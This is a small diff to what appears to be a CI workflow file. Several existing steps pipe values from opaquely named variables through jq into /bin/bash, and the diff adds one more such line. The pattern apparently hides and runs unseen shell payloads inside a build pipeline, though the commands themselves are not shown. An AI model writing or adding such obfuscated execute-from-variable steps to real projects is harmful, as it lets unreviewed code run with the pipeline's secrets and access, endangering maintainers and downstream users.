@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$dpor017" | jq -r .gq89748 | /bin/bash
           echo $qhgoi07 | jq -r .bmn81 | /bin/bash
           echo $cl67813 | jq -r .iat27351 | /bin/bash
+          echo $rm25380 | jq -r .cnfhg12 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
